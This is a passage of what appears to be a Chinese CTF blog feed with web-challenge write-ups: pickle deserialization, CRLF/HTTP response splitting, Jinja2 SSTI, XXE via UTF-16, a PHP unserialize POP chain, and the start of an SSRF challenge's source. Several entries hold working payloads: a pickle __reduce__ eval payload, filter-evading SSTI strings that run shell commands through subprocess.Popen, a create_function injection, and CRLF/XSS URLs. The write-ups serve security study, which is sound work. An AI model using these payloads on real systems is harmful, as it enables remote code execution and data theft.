<p>下载后在admin.py中看到python反序列化的代码</p>
<pre class=" language-python"><code class="language-python">  <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
<p><strong>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</strong></p>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726204028813.png" alt="image-20210726204028813"></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> urllib

<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">print</span> a</code></pre>
<pre><code>become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.=</code></pre>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726205302570.png" alt="image-20210726205302570"></p>
]]></content>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF漏洞</title>
    <url>/2021/09/11/crlf-lou-dong/</url>
    <content><![CDATA[<p>原文：<a href="https://link.jianshu.com/?t=http://www.codesec.net/view/50272.html">http://www.codesec.net/view/50272.html</a></p>
<p>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</p>
<p>HRS是比XSS危害更大的安全问题，具体是为什么，我们往下看。</p>
<p>对于HRS最简单的利用方式是注入两个\r\n，之后在写入XSS代码，来构造一个xss。</p>
<h3 id="0x01-实例"><a href="#0x01-实例" class="headerlink" title="0x01 实例"></a>0x01 实例</h3><p> 举个例子，一般网站会在HTTP头中用Location:<a href="https://link.jianshu.com/?t=http://baidu.com">http://baidu.com</a>这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</p>
<p>所以一个正常的302跳转包是这样：</p>
<pre class=" language-dart"><code class="language-dart">HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">302</span> 
Moved Temporarily Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">27</span> Jun <span class="token number">2014</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">17</span> GMT 
Content<span class="token operator">-</span> Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span> 
Connection<span class="token punctuation">:</span> close
Location<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sina<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn</code></pre>
<p>但如果我们输入的是</p>
<p>[<a href="http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun]">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun]</a>(<a href="https://link.jianshu.com/?t=http://www.sina.com.cn">https://link.jianshu.com?t=http://www.sina.com.cn</a> Set-cookie:JSPSESSID%3Dwooyun)<br> 注入了一个换行，此时的返回包就会变成这样：</p>
<pre class=" language-dart"><code class="language-dart">HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">302</span> Moved Temporarily Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">27</span> Jun <span class="token number">2014</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">17</span> GMT
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html 
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span> 
Connection<span class="token punctuation">:</span> close 
Location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sina<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn Set<span class="token operator">-</span>cookie<span class="token punctuation">:</span> JSPSESSID<span class="token operator">=</span>wooyun</code></pre>
<p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p>
<p>当然，HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>比如一个网站接受url参数<a href="https://link.jianshu.com/?t=http://test.sina.com.cn/?url=xxx">http://test.sina.com.cn/?url=xxx</a>，xxx放在Location后面作为一个跳转。如果我们输入的是</p>
<p><a href="https://link.jianshu.com/?t=http://test.sina.com.cn/?url=">http://test.sina.com.cn/?url=%0d%0a%0d%0a</a>&lt;imgsrc=1onerror=alert(/xss/)&gt;<br> 我们的返回包就会变成这样：</p>
<p>HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT  Content-Type: text/html Content-Length: 154 Connection: close Location:  <img src="/2021/09/11/crlf-lou-dong/1" onerror="alert(/xss/)"><br> 之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。</p>
<p>为什么说是无视浏览器filter的，这里涉及到另一个问题。</p>
<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
<p>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<p>所以说HRS的危害大于XSS，因为它能绕过一般XSS所绕不过的filter，并能产生会话固定漏洞。</p>
<p>我们来一个真实案例吧。 新浪某分站含有一个url跳转漏洞，危害并不大，于是我就想到了CRLFInjection，当我测试</p>
<p><a href="https://link.jianshu.com/?t=http://xxx.sina.com.cn/?url=">http://xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E</a><br> 的时候，发现图片已经输出在页面中了，说明CRLF注入成功了：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5557607-e18180bd46ba67d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/659" alt="img"></p>
<p>Paste_Image.png</p>
<p>那么我们试试XSS看看：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5557607-2dfa3e0ca5f573d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/879" alt="img"></p>
<p>Paste_Image.png</p>
<p>@mramydnei还想到了一个利用字符编码来绕过XSSFilter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个</p>
<p>&lt;metacharset=ISO-2022-KR&gt;</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5557607-62d386e1e365d69a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/924" alt="img"></p>
<p>Paste_Image.png</p>
<p>当然，在Location:这里注入只有webkit内核浏览器才能够利用，其他浏览器可能会跳转、出错。不过对于chrome的使用量来说，危害已经足够了。</p>
<h3 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h3><p> 如何修复HRS漏洞，当然是过滤\r、\n之类的换行符，避免输入的数据污染到其他HTTP头</p>
]]></content>
  </entry>
  <entry>
    <title>CSAW2021</title>
    <url>/2021/10/30/csaw2021/</url>
    <content><![CDATA[<p><img src="/2021/10/30/csaw2021/1.png" alt="image-20211030195537198"></p>
<h1 id="Ninja🥷"><a href="#Ninja🥷" class="headerlink" title="Ninja🥷"></a>Ninja🥷</h1><p>ssti-&gt;payload</p>
<pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f'+'b'+'ase\x5f\x5f')|attr('x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()}}</code></pre>
<pre><code>{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__</code></pre>
<pre><code>{{()|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(258)(%27cat+flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(0)|attr(%27decode%27)(%27utf-8%27)}}</code></pre>
<p>flag{m0mmy_s33_1m_4_r34l_n1nj4}</p>
<h1 id="Gatekeeping"><a href="#Gatekeeping" class="headerlink" title="Gatekeeping"></a>Gatekeeping</h1><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> binascii

<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'dist/flag.txt.enc'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    iv <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">]</span>

    data <span class="token operator">=</span> data<span class="token punctuation">[</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">:</span><span class="token punctuation">]</span>
    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>flag{gunicorn_probably_should_not_do_that}</p>
<h1 id="No-pass-needed"><a href="#No-pass-needed" class="headerlink" title="No-pass-needed"></a>No-pass-needed</h1><p><img src="/2021/10/30/csaw2021/2.png" alt="image-20211031152446651"></p>
<p>flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}</p>
]]></content>
  </entry>
  <entry>
    <title>CSAW2019：Web_Unagi</title>
    <url>/2021/10/12/csaw2019-web-unagi/</url>
    <content><![CDATA[<p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111131352.png" alt="image-20211012111131352"></p>
<p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111138400.png" alt="image-20211012111138400"></p>
<p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111157678.png" alt="image-20211012111157678"></p>
<p>XXE编码转换为UTF-16绕过</p>
<pre><code>iconv -f utf8 -t utf-16 2.xml&gt;1.xml</code></pre>
<p><img src="/2021/10/12/csaw2019-web-unagi/image-20211012111418969.png" alt="image-20211012111418969"></p>
]]></content>
  </entry>
  <entry>
    <title>CSCCTF:2019-FlaskLight</title>
    <url>/2021/08/03/cscctf-2019-flasklight/</url>
    <content><![CDATA[<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221446406.png" alt="image-20210804221446406"></p>
<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221459641.png" alt="image-20210804221459641"></p>
<p>ssrf:</p>
<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221549079.png" alt="image-20210804221549079"></p>
<pre><code>?search={{''.__class__.__mro__[2].__subclasses__()}}</code></pre>
<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221636358.png" alt="image-20210804221636358"></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> html
<span class="token keyword">import</span> time

index <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">"http://bba811f6-a5bb-42b0-a5f5-95754c273293.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()["</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]}}"</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        res <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;h2>You searched for:&lt;\/h2>\W+&lt;h3>(.*)&lt;\/h3>"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(res)</span>
        <span class="token comment" spellcheck="true"># print(r.text)</span>
        res <span class="token operator">=</span> html<span class="token punctuation">.</span>unescape<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> res<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"subprocess.Popen"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
            index <span class="token operator">=</span> i
            <span class="token keyword">break</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"indexo of subprocess.Popen:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804222546254.png" alt="image-20210804222546254"></p>
<pre><code>?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}</code></pre>
<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804222527142.png" alt="image-20210804222527142"></p>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2021-9</title>
    <url>/2021/09/25/dasctf2021-9/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'No!No!No!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
            <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//There is no code to print flag in flag.php</span>
            <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token string">"Nice Job!!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span> </code></pre>
<ul>
<li><strong>__toString() //把类当作字符串使用时触发</strong></li>
<li><strong>__invoke() //当脚本尝试将对象调用为函数时触发</strong></li>
</ul>
<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token operator">=</span><span class="token string">"create_function"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token operator">=</span>"<span class="token punctuation">}</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>VHJ1M2ZsYWcucGhw<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//";</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<pre><code>?pop=O:1:"A":1:{s:3:"var";O:1:"B":2:{s:4:"func";s:15:"create_function";s:3:"arg";s:73:"}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//";}}</code></pre>
]]></content>
  </entry>
  <entry>
    <title>De1CTF:2019-SSRFMe</title>
    <url>/2021/07/01/de1ctf-2019-ssrfme/</url>
    <content><![CDATA[<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python </span>
<span class="token comment" spellcheck="true">#encoding=utf-8 </span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask 
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request 
<span class="token keyword">import</span> socket 
<span class="token keyword">import</span> hashlib 
<span class="token keyword">import</span> urllib 
<span class="token keyword">import</span> sys 
<span class="token keyword">import</span> os 
<span class="token keyword">import</span> json 
reload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span> 
sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span> 

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> 
secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> 

<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span> 
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    self<span class="token punctuation">.</span>action <span class="token operator">=</span> action 
    self<span class="token punctuation">.</span>param <span class="token operator">=</span> param 
    self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign 
    self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#SandBox For Remote_Addr </span>
        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span> 

    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span> 
        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 
        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span> 
                tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> 
                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> 
                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp 
                <span class="token keyword">else</span><span class="token punctuation">:</span> 
                    <span class="token keyword">print</span> resp
                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> 
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span> 
            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span> 
                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> 
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span> 
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> 
            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span> 
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span> 
            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span> 
